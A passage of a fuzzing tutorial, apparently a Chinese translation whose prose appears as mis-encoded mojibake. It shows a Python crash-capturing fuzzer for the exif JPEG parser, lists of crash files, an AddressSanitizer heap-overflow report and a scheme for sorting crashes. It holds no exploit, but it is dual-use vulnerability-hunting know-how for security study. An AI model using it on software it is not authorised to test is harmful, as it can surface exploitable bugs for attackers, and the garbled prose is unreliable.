fault</code>æ¶ˆæ¯ç›‘æ§<code>stdout</code>å’Œ<code>sterr</code>æ˜¯ï¼Œå®ƒä»æœªå‡ºç°ï¼Œè¿™æ˜¯å› ä¸º<code>Segmentation fault</code>æ¶ˆæ¯æ˜¯æ¥è‡ªæˆ‘ä»¬çš„å‘½ä»¤è¡Œ<code>shell</code>è€Œä¸æ˜¯äºŒè¿›åˆ¶ï¼Œè¿™æ„å‘³ç€<code>shell</code>æ”¶åˆ°ä¸€ä¸ª<code>SIGSEGV</code>ä¿¡å·ï¼Œå¹¶ä¸”ä¼šåé¦ˆæ‰“å°è¿™ä¸ªä¿¡æ¯ã€‚</p><p>æˆ‘å‘ç°ç›‘æ§è¿™ä¸ªçš„æœ‰ä¸€ç§æ–¹æ³•ç”¨<code>pexpect Python module</code>çš„<code>use()</code>æ–¹æ³•å’Œ<code>pipes Python module</code>çš„<code>quote()</code>æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬å°†åŠ ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œè¿™ä¸ªå°†è¾“å…¥<code>counter</code>ä½œä¸ºå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä¸ºæˆ‘ä»¬<code>fuzzer</code>è¿­ä»£çš„è½®æ•°ï¼Œå¦å¤–ä¸€ä¸ªå‚æ•°æ˜¯å˜å¼‚çš„æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬çœ‹åˆ°<code>Segmentation</code>åœ¨æˆ‘ä»¬<code>run()</code>æŒ‡ä»¤çš„è¾“å‡ºé‡Œé¢ï¼Œæˆ‘ä»¬å°†æŠŠè¿™ä¸ªå˜å¼‚çš„æ•°æ®å†™å…¥æ–‡ä»¶å¹¶ä¿å­˜ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æœ‰è®©äºŒè¿›åˆ¶<code>crash</code>çš„<code>JPEG</code>å›¾ç‰‡äº†ã€‚</p><p>è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ç§°ä¸º<code>crashes</code>æ–‡ä»¶å¤¹ï¼Œç„¶åæˆ‘ä»¬å°†åœ¨è¿™é‡Œé¢ä¿å­˜<code>JPEGs</code>ï¼Œè¿™äº›å¯¼è‡´<code>crashes</code>çš„å›¾ç‰‡å°†ä¼šä»¥<code>crash.&lt;fuzzing iteration (counter)&gt;.jpg</code>çš„æ ¼å¼ä¿å­˜ï¼Œæ‰€ä»¥å¦‚æœè¿™ä¸ª<code>fuzzing</code>è¿­ä»£äº†100æ¬¡å¯¼è‡´äº†<code>a crash</code>ï¼Œæˆ‘ä»¬åº”è¯¥ä¼šå¾—åˆ°è¿™æ ·çš„æ–‡ä»¶ï¼š<code>/crashes/crash.100.jpg</code></p><p>æˆ‘ä»¬å°†æŒç»­ä»¥ä¿æŒæ¯100æ¬¡æ¨¡ç³Šæµ‹è¯•è¿­ä»£çš„è®¡æ•°æ‰“å°åˆ°ç»ˆç«¯çš„åŒä¸€è¡Œï¼Œæˆ‘ä»¬çš„å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    command = <span class="hljs-string">&quot;exif mutated.jpg -verbose&quot;</span>    out, returncode = run(<span class="hljs-string">&quot;sh -c &quot;</span> + quote(command), withexitstatus=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Segmentation&quot;</span> <span class="hljs-keyword">in</span> out:        f = open(<span class="hljs-string">&quot;crashes/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)    <span class="hljs-keyword">if</span> counter % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:        print(counter, end=<span class="hljs-string">&quot;\r&quot;</span>)</code></pre><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åœ¨æˆ‘ä»¬ä»£ç çš„æœ€ä¸‹é¢æ›¿æ¢æˆ‘ä»¬æ‰§è¡Œçš„<code>stub</code>ä»¥è·‘ä¸€ä¸ªè®¡æ•°å™¨ï¼Œä¸€æ—¦æˆ‘ä»¬è¾¾åˆ°äº†<code>1000</code>æ¬¡è¿­ä»£ï¼Œæˆ‘ä»¬å°±åœæ­¢<code>fuzzing</code>ï¼Œæˆ‘ä»¬ä¹Ÿå°†è®©æˆ‘ä»¬çš„<code>fuzzer</code>éšæœºé€‰æ‹©ä¸€ä¸ªæˆ‘ä»¬å˜å¼‚çš„æ–¹æ³•ï¼Œæ‰€ä»¥å®ƒæˆ–ä½¿ç”¨ä½ç¿»è½¬æˆ–ä½¿ç”¨é­”æ•°ï¼Œè®©æˆ‘ä»¬è¿è¡Œå®ƒï¼Œç„¶ååœ¨ç»“æŸæ—¶æ£€æµ‹æˆ‘ä»¬çš„<code>crashes</code>æ–‡ä»¶å¤¹ã€‚</p><p>å½“<code>fuzzer</code>ç»“æŸåï¼Œä½ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è·å¾—äº†å¤§æ¦‚<code>30</code>ä¸ª<code>crashes</code>ã€‚</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes# lscrash<span class="hljs-number">.102</span>.jpg  crash<span class="hljs-number">.317</span>.jpg  crash<span class="hljs-number">.52</span>.jpg   crash<span class="hljs-number">.620</span>.jpg  crash<span class="hljs-number">.856</span>.jpgcrash<span class="hljs-number">.129</span>.jpg  crash<span class="hljs-number">.324</span>.jpg  crash<span class="hljs-number">.551</span>.jpg  crash<span class="hljs-number">.694</span>.jpg  crash<span class="hljs-number">.861</span>.jpgcrash<span class="hljs-number">.152</span>.jpg  crash<span class="hljs-number">.327</span>.jpg  crash<span class="hljs-number">.559</span>.jpg  crash<span class="hljs-number">.718</span>.jpg  crash<span class="hljs-number">.86</span>.jpgcrash<span class="hljs-number">.196</span>.jpg  crash<span class="hljs-number">.362</span>.jpg  crash<span class="hljs-number">.581</span>.jpg  crash<span class="hljs-number">.775</span>.jpg  crash<span class="hljs-number">.984</span>.jpgcrash<span class="hljs-number">.252</span>.jpg  crash<span class="hljs-number">.395</span>.jpg  crash<span class="hljs-number">.590</span>.jpg  crash<span class="hljs-number">.785</span>.jpg  crash<span class="hljs-number">.985</span>.jpgcrash<span class="hljs-number">.285</span>.jpg  crash<span class="hljs-number">.44</span>.jpg   crash<span class="hljs-number">.610</span>.jpg  crash<span class="hljs-number">.84</span>.jpg   crash<span class="hljs-number">.987</span>.jpg</code></pre><p>æˆ‘ä»¬ç°åœ¨å¯ä»¥ç”¨ä¸€è¡Œå¿«é€Ÿçš„ä»£ç è¯å®è¿™ä¸ªç»“æœï¼š<code>root@kali:~/crashes# for i in *.jpg; do exif &quot;$i&quot; -verbose &gt; /dev/null 2&gt;&amp;1; done</code> ï¼Œè®°ä½æˆ‘ä»¬å¯ä»¥å°†<code>STDOUT</code>å’Œ<code>STDERR</code>éƒ½å¯¼å‘<code>/dev/null</code>ï¼Œå› ä¸º<code>Segmentation fault</code>æ˜¯æ¥è‡ª<code>shell</code>ï¼Œè€Œä¸æ˜¯æ¥è‡ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬è·‘ä¸Šé¢è¿™æŒ‡ä»¤ï¼Œä»¥ä¸‹ä¸ºè¾“å‡ºï¼š</p><pre><code class="hljs properties"><span class="hljs-meta">root@kali</span>:<span class="hljs-string">~/crashes# for i in *.jpg; do exif &quot;$i&quot; -verbose &gt; /dev/null 2&gt;&amp;1; done</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">-----SNIP-----</span></code></pre><p>ä½ ä¸å¯ä»¥çœ‹åˆ°å®ƒä»¬çš„æ‰€æœ‰ï¼Œä½†æ˜¯è¿™é‡Œç¡®å®æœ‰30ä¸ª<code>segfaults</code>ï¼Œæ‰€ä»¥æ‰€æœ‰çš„äº‹æƒ…éƒ½ä¼¼ä¹æŒ‰ç…§è®¡åˆ’çš„è¿›è¡Œã€‚</p><h2 id="Triaging-Crashes"><a href="#Triaging-Crashes" class="headerlink" title="Triaging Crashes"></a>Triaging Crashes</h2><p>ç°åœ¨æˆ‘ä»¬æœ‰å¤§çº¦30ä¸ª<code>crashes</code>å’Œå¯¼è‡´<code>crashes</code>çš„<code>JPEGs</code>ï¼Œä¸‹ä¸€æ­¥æ˜¯åˆ†æè¿™äº›<code>crahes</code>å¹¶æ‰¾å‡ºå…¶ä¸­å®ƒä»¬æœ‰å¤šå°‘æ˜¯<code>unique</code>ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€äº›æˆ‘ä»¬çœ‹<code>Brandon Faulk</code>çš„è§†é¢‘å­¦åˆ°çš„ä¸œè¥¿ï¼Œç”¨<code>Beyond Compare</code>å¿«é€Ÿçœ‹ä¸€é<code>crash</code>çš„æ ·æœ¬ï¼Œæˆ‘ä»¬å‘ç°å¤§éƒ¨åˆ†éƒ½æ˜¯å› ä¸ºæˆ‘ä»¬çš„<code>bit_flip()</code>å˜å¼‚è€Œä¸æ˜¯<code>magic()</code>å˜å¼‚æ–¹æ³•äº§ç”Ÿçš„ï¼Œè¿™å¾ˆæœ‰è¶£ï¼Œä½œä¸ºæµ‹è¯•ï¼Œå½“æˆ‘ä»¬è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å…³é—­å‡½æ•°é€‰æ‹©çš„éšæœºæ€§ï¼Œåªä½¿ç”¨<code>magic()</code>å˜å¼‚æ–¹å¼è¿è¡Œ100000æ¬¡è¿­ä»£ï¼Œå†çœ‹çœ‹æˆ‘ä»¬æ˜¯å¦ä¼šé‡åˆ°ä»»ä½•<code>crahes</code></p><h2 id="Using-ASan-to-Analyze-Crashes"><a href="#Using-ASan-to-Analyze-Crashes" class="headerlink" title="Using ASan to Analyze Crashes"></a>Using ASan to Analyze Crashes</h2><p><code>ASan</code>æ˜¯<code>Address Sanitizer</code>ï¼Œå®ƒæ˜¯è¾ƒæ–°ç‰ˆæœ¬çš„<code>gcc</code>é™„å¸¦çš„æœ‰æ•ˆå·¥å…·ï¼Œå…è®¸ç”¨æˆ·åœ¨ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ä½¿ç”¨<code>-fsanitize=address</code>å‚æ•°æ‰“å¼€ï¼Œå¹¶åœ¨å‘ç”Ÿå†…å­˜è®¿é—®é”™è¯¯æ—¶ï¼ˆå³ä½¿æ˜¯é‚£äº›å¯¼è‡´<code>crash</code>çš„æ—¶å€™ï¼‰è·å¾—éå¸¸è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬è¿™é‡Œå·²ç»é¢„é€‰æ‹©äº†ä¼šå´©æºƒçš„è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬é”™è¿‡è¯¥æœ‰æ•ˆå·¥å…·ï¼ˆç¬”è€…è®¤ä¸ºè¿™é‡ŒæŒ‡çš„æ„æ€æ˜¯åœ¨<code>fuzzing</code>çš„æ—¶å€™æ²¡æœ‰ç”¨<code>ASan</code>ï¼‰ï¼Œä½†ä¹Ÿè®¸æˆ‘ä»¬å°†ä¼šä¿å­˜å®ƒåœ¨å…¶ä»–æ—¶é—´ï¼ˆä½¿ç”¨ï¼‰ï¼ˆç¬”è€…è®¤ä¸ºè¿™é‡ŒæŒ‡çš„æ˜¯åœ¨è°ƒ<code>crash</code>çš„æ—¶å€™ä½¿ç”¨å¸¦<code>ASan</code>çš„ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚</p><p>ä¸ºäº†ä½¿ç”¨ ASanï¼Œæˆ‘è·Ÿç€<a href="https://fuzzing-project.org/tutorial2.html">the Fuzzing Project</a>çš„æ€è·¯ï¼Œç„¶åç”¨å¦‚ä¸‹<code>flags: cc -fsanitize=address -ggdb -o exifsan sample_main.c exif.c</code>é‡æ–°ç¼–è¯‘äº†<code>exif</code> </p><p>ç„¶åä¸ºäº†æ–¹ä¾¿ä½¿ç”¨æˆ‘å°†<code>exifsan</code> ç§»åŠ¨åˆ°<code>/usr/bin</code>ï¼Œå¦‚æœæˆ‘ä»¬åœ¨<code>crash</code>æ ·æœ¬ä¸Šè¿è¡Œè¿™ä¸ªæ–°ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹è¾“å‡ºå§</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes# exifsan crash<span class="hljs-number">.252</span>.jpg -verbosesystem: little-endian  data: little-endian===================================================================<span class="hljs-number">18831</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="hljs-number">0xb4d00758</span> at pc <span class="hljs-number">0x00415b9e</span> bp <span class="hljs-number">0xbf8c91f8</span> sp <span class="hljs-number">0xbf8c91ec</span>READ of size <span class="hljs-number">4</span> at <span class="hljs-number">0xb4d00758</span> thread T0                                                                                                  #<span class="hljs-number">0</span> <span class="hljs-number">0x415b9d</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2356</span>    #<span class="hljs-number">1</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0x407310</span> <span class="hljs-keyword">in</span> _start (/usr/bin/exifsan+<span class="hljs-number">0x2310</span>)<span class="hljs-number">0xb4d00758</span> <span class="hljs-keyword">is</span> located <span class="hljs-number">0</span> bytes to the right of <span class="hljs-number">8</span>-byte region [<span class="hljs-number">0xb4d00750</span>,<span class="hljs-number">0xb4d00758</span>)allocated by thread T0 here:                                                                                                            #<span class="hljs-number">0</span> <span class="hljs-number">0xb7aa2097</span> <span class="hljs-keyword">in</span> __interceptor_malloc (/lib/i386-linux-gnu/libasan.so<span class="hljs-number">.5</span>+<span class="hljs-number">0x10c097</span>)    #<span class="hljs-number">1</span> <span class="hljs-number">0x415a9f</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2348</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>SUMMARY: AddressSanitizer: heap-buffer-overflow /root/exif/exif.c:<span class="hljs-number">2356</span> <span class="hljs-keyword">in</span> parseIFDShadow bytes around the buggy address:  <span class="hljs-number">0x369a0090</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00a0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00b0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00c0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00d0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa=&gt;<span class="hljs-number">0x369a00e0</span>: fa fa fa fa fa fa fa fa fa fa <span class="hljs-number">00</span>[fa]fa fa <span class="hljs-number">04</span> fa  <span class="hljs-number">0x369a00f0</span>: fa fa <span class="hljs-number">00</span> <span class="hljs-number">06</span> fa fa <span class="hljs-number">06</span> fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0100</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0110</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0120</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0130</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents <span class="hljs-number">8</span> application bytes):  Addressable:           <span class="hljs-number">00</span>  Partially addressable: <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> <span class="hljs-number">05</span> <span class="hljs-number">06</span> <span class="hljs-number">07</span>   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-keyword">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      fc  Array cookie:            ac  Intra object redzone:    bb  ASan <span class="hljs-built_in">int</span>ernal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==<span class="hljs-number">18831</span>==ABORTING</code></pre><p>å¾ˆä¸é”™ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥è·å¾—è¯¦ç»†ä¿¡æ¯ï¼Œè€Œä¸”<code>ASan</code>è¿˜ä¸ºæˆ‘ä»¬åŒºåˆ†äº†é”™è¯¯ç±»åˆ«ï¼Œå‘Šè¯‰æˆ‘ä»¬<code>crash</code>åœ°å€å¹¶æä¾›ä¸€ä¸ªå¾ˆå¥½çš„å †æ ˆè°ƒç”¨ï¼Œæ­£å¦‚ä½ æ‰€è§ï¼Œæˆ‘ä»¬åœ¨<code>exif.c</code>çš„<code>parseIFD </code>å‡½æ•°ä¸­æ‰§è¡Œäº†ä¸€ä¸ª4å­—èŠ‚çš„è¯»æ“ä½œã€‚</p><pre><code class="hljs angelscript">READ of size <span class="hljs-number">4</span> at <span class="hljs-number">0xb4d00758</span> thread T0                                                                                                  #<span class="hljs-number">0</span> <span class="hljs-number">0x415b9d</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2356</span>    #<span class="hljs-number">1</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0x407310</span> <span class="hljs-keyword">in</span> _start (/usr/bin/exifsan+<span class="hljs-number">0x2310</span>)</code></pre><p>ç”±äºç°åœ¨è¿™éƒ½æ˜¯æ ‡å‡†äºŒè¿›åˆ¶è¾“å‡ºï¼Œæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥å¯¹è¿™äº›<code>crash</code>è¿›è¡Œåˆ†ç±»å¹¶å°è¯•ç†è§£å®ƒä»¬ï¼Œè®©æˆ‘ä»¬é¦–å…ˆå°è¯•å¯¹<code>crash</code>è¿›è¡Œå†—ä½™åˆ é™¤ï¼Œæœ‰å¯èƒ½æˆ‘ä»¬æ‰€æœ‰çš„30æ¬¡å´©æºƒéƒ½æ˜¯åŒä¸€ä¸ªé”™è¯¯ã€‚ä¹Ÿæœ‰å¯èƒ½æˆ‘ä»¬æœ‰30æ¬¡<code>unqiue crashes</code>ï¼ˆä¸å¤ªå¯èƒ½å“ˆå“ˆï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>è®©æˆ‘ä»¬å†æ¬¡è°ƒç”¨<code>Python</code>è„šæœ¬ï¼Œæˆ‘ä»¬å°†éå†è¯¥æ–‡ä»¶å¤¹ï¼Œå¯¹æ¯æ¬¡<code>crash</code>è¿è¡Œå¯ç”¨<code>ASan</code>çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶è®°å½•æ¯ä¸ª<code>crash</code>åœ°å€çš„ä½ç½®ï¼Œæˆ‘ä»¬è¿˜å°†å°è¯•æ•è·å®ƒæ˜¯<code>READ</code>è¿˜æ˜¯<code>WRITE</code>æ“ä½œï¼Œä¾‹å¦‚ï¼Œå¯¹äº<code>crash.252.jpg</code>ï¼Œæˆ‘ä»¬å°†æ—¥å¿—æ–‡ä»¶åå­—æ ¼å¼åŒ–ä¸ºï¼š<code>crash.252.HBO.b4f00758.READ</code>ï¼Œå¹¶å°†<code>ASan</code>è¾“å‡ºå†™å…¥æ—¥å¿—ï¼Œè¿™æ ·æˆ‘ä»¬ç”šè‡³åœ¨æ‰“å¼€æ—¥å¿—ä¹‹å‰å°±çŸ¥é“å¯¼è‡´å®ƒçš„<code>crash</code>å›¾ç‰‡åã€<code>bug</code>çš„ç±»åˆ«ã€åœ°å€å’Œæ“ä½œã€‚ ï¼ˆæˆ‘ä¼šåœ¨æœ€åè´´æ£€æµ‹å’Œåˆ†ç±»çš„è„šæœ¬ï¼Œå¤ªæ¶å¿ƒäº†ï¼Œæˆ‘è®¨åŒå®ƒï¼‰</p><p>åœ¨æˆ‘ä»¬çš„<code>crashes</code>æ–‡ä»¶å¤¹ä¸Šè¿è¡Œæ£€æµ‹å’Œåˆ†ç±»è„šæœ¬åï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»åˆ†ç±»äº†æˆ‘ä»¬çš„<code>crashes</code>å¹¶ä¸”æœ‰ä¸€äº›éå¸¸æœ‰è¶£çš„ä¸œè¥¿ã€‚</p><pre><code class="hljs css"><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.102</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f006d4</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.102</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005dc</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005dc</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.317</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005b4</span><span class="hljs-selector-class">.WRITE</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.317</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.285</span><span class="hljs-selector-class">.SEGV</span><span class="hljs-selector-class">.00000000</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.285</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">------SNIP-----</span></code></pre><p>åœ¨é‚£é‡Œè¿›è¡Œäº†ä¸€æ¬¡å¤§<code>SNIP</code>ä¹‹åï¼Œåœ¨æˆ‘çš„30æ¬¡<code>crash</code>ä¸­ï¼Œæˆ‘åªæœ‰ä¸€æ¬¡<code>WRITE</code>æ“ä½œã€‚ä½ æ— æ³•ä»æˆªæ–­çš„è¾“å‡ºä¸­çœ‹åˆ°ï¼Œä½†æˆ‘ä¹Ÿæœ‰å¾ˆå¤š<code>SEGV</code>é”™è¯¯å› ä¸º<code>NULL</code>åœ°å€è¢«å¼•ç”¨äº†(0x00000000)</p><p>è®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹æˆ‘ä»¬ä¿®æ”¹åçš„<code>fuzzer</code>ï¼Œå®ƒåªè¿è¡Œäº†100000æ¬¡è¿­ä»£çš„<code>magic()</code>ç¼–è¯‘ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦æ‰¾åˆ°ä»»ä½•<code>bugs</code></p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes2# lscrash<span class="hljs-number">.10354</span>.jpg  crash<span class="hljs-number">.2104</span>.jpg   crash<span class="hljs-number">.3368</span>.jpg   crash<span class="hljs-number">.45581</span>.jpg  crash<span class="hljs-number">.64750</span>.jpg  crash<span class="hljs-number">.77850</span>.jpg  crash<span class="hljs-number">.86367</span>.jpg  crash<span class="hljs-number">.94036</span>.jpgcrash<span class="hljs-number">.12771</span>.jpg  crash<span class="hljs-number">.21126</span>.jpg  crash<span class="hljs-number">.35852</span>.jpg  crash<span class="hljs-number">.46757</span>.jpg  crash<span class="hljs-number">.64987</span>.jpg  crash<span class="hljs-number">.78452</span>.jpg  crash<span class="hljs-number">.86560</span>.jpg  crash<span class="hljs-number">.9435</span>.jpgcrash<span class="hljs-number">.13341</span>.jpg  crash<span class="hljs-number">.23547</span>.jpg  crash<span class="hljs-number">.39494</span>.jpg  crash<span class="hljs-number">.46809</span>.jpg  crash<span class="hljs-number">.66340</span>.jpg  crash<span class="hljs-number">.78860</span>.jpg  crash<span class="hljs-number">.88799</span>.jpg  crash<span class="hljs-number">.94770</span>.jpgcrash<span class="hljs-number">.14060</span>.jpg  crash<span class="hljs-number">.24492</span>.jpg  crash<span class="hljs-number">.40953</span>.jpg  crash<span class="hljs-number">.49520</span>.jpg  crash<span class="hljs-number">.6637</span>.jpg   crash<span class="hljs-number">.79019</span>.jpg  crash<span class="hljs-number">.89072</span>.jpg  crash<span class="hljs-number">.95438</span>.jpgcrash<span class="hljs-number">.14905</span>.jpg  crash<span class="hljs-number">.25070</span>.jpg  crash<span class="hljs-number">.41505</span>.jpg  crash<span class="hljs-number">.50723</span>.jpg  crash<span class="hljs-number">.66389</span>.jpg  crash<span class="hljs-number">.79824</span>.jpg  crash<span class="hljs-number">.89738</span>.jpg  crash<span class="hljs-number">.95525</span>.jpgcrash<span class="hljs-number">.18188</span>.jpg  crash<span class="hljs-number">.27783</span>.jpg  crash<span class="hljs-number">.41700</span>.jpg  crash<span class="hljs-number">.52051</span>.jpg  crash<span class="hljs-number">.6718</span>.jpg   crash<span class="hljs-number">.81206</span>.jpg  crash<span class="hljs-number">.90506</span>.jpg  crash<span class="hljs-number">.96746</span>.jpgcrash<span class="hljs-number">.18350</span>.jpg  crash<span class="hljs-number">.2990</span>.jpg   crash<span class="hljs-number">.43509</span>.jpg  crash<span class="hljs-number">.54074</span>.jpg  crash<span class="hljs-number">.68527</span>.jpg  crash<span class="hljs-number">.8126</span>.jpg   crash<span class="hljs-number">.90648</span>.jpg  crash<span class="hljs-number">.98727</span>.jpgcrash<span class="hljs-number">.19441</span>.jpg  crash<span class="hljs-number">.30599</span>.jpg  crash<span class="hljs-number">.43765</span>.jpg  crash<span class="hljs-number">.55183</span>.jpg  crash<span class="hljs-number">.6987</span>.jpg   crash<span class="hljs-number">.82472</span>.jpg  crash<span class="hljs-number">.90745</span>.jpg  crash<span class="hljs-number">.9969</span>.jpgcrash<span class="hljs-number">.19581</span>.jpg  crash<span class="hljs-number">.31243</span>.jpg  crash<span class="hljs-number">.43813</span>.jpg  crash<span class="hljs-number">.5857</span>.jpg   crash<span class="hljs-number">.70713</span>.jpg  crash<span class="hljs-number">.83282</span>.jpg  crash<span class="hljs-number">.92426</span>.jpgcrash<span class="hljs-number">.19907</span>.jpg  crash<span class="hljs-number">.31563</span>.jpg  crash<span class="hljs-number">.44974</span>.jpg  crash<span class="hljs-number">.59625</span>.jpg  crash<span class="hljs-number">.77590</span>.jpg  crash<span class="hljs-number">.83284</span>.jpg  crash<span class="hljs-number">.92775</span>.jpgcrash<span class="hljs-number">.2010</span>.jpg   crash<span class="hljs-number">.32642</span>.jpg  crash<span class="hljs-number">.4554</span>.jpg   crash<span class="hljs-number">.64255</span>.jpg  crash<span class="hljs-number">.77787</span>.jpg  crash<span class="hljs-number">.84766</span>.jpg  crash<span class="hljs-number">.92906</span>.jpg</code></pre><p>è¿™æœ‰ä¸€å †<code>crashes</code></p><h2 id="Getting-Serious-Conclusion"><a href="#Getting-Serious-Conclusion" class="headerlink" title="Getting Serious, Conclusion"></a>Getting Serious, 